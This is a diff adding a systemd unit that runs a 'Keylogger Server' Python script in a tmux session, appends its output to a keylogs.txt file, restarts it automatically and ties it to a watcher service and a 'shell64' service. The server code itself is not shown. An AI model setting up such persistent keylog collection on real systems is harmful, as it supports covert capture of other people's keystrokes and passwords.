@@ -1,0 +1,21 @@
+[Unit]
+Description=Keylogger Server (tmux)
+PartOf=shell64.service
+After=network.target
+Wants=keylogger-watcher.service
+
+[Service]
+Type=forking
+User=joe
+WorkingDirectory=/home/joe/keylogger
+ExecStart=/usr/bin/tmux -L keylogger-server new-session -d -s keylogger-server '/usr/bin/python3 -u /home/joe/keylogger/server.py 2>&1 | tee -a /home/joe/keylogger/keylogs.txt'
+ExecStop=/usr/bin/tmux -L keylogger-server kill-session -t keylogger-server
+ExecStopPost=/home/joe/keylogger/merge_logs.sh
+Restart=always
+RestartSec=2
+Environment="PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin"
+Environment="TERM=xterm-256color"
+
+[Install]
+WantedBy=multi-user.target
+Also=keylogger-watcher.service
